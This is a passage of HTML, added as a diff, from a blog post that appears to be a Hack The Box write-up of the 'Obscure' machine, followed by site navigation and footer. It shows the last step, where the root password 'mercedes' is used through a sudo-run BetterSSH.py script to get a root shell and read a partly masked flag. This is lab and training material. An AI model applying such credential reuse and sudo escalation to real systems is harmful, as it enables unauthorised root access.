+  </div>
+
+
+<p>If we try to access via SSH with root user and mercedes password, we can not get a session. Nevertheless, using the BetterSSH.py script from Robert&rsquo;s session, we can authenticate using these credentials and obtain the root flag:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="325978614" type="checkbox"  />
+    <label for="325978614">
+      <span class="collapsable-code__language">bash</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+robert@obscure:~/BetterSSH$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
+Enter username: root
+Enter password: mercedes
+Authed!
+root@Obscure$ cat /root/root.txt
+Output: 512fd4**************
+
+</code></pre>
+  </div>
+
+
+<p>So the machine is completed.</p>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="https://raulmart.in/posts/cybex-ctf-2020/">
+                <span class="button__icon">←</span>
+                <span class="button__text">Cybex 2020 CTF</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="https://raulmart.in/posts/mango-writeup/">
+                <span class="button__text">Mango HTB WriteUp</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2020 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script src="https://raulmart.in/js/menu.js"></script>
+<script src="https://raulmart.in/js/prism.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
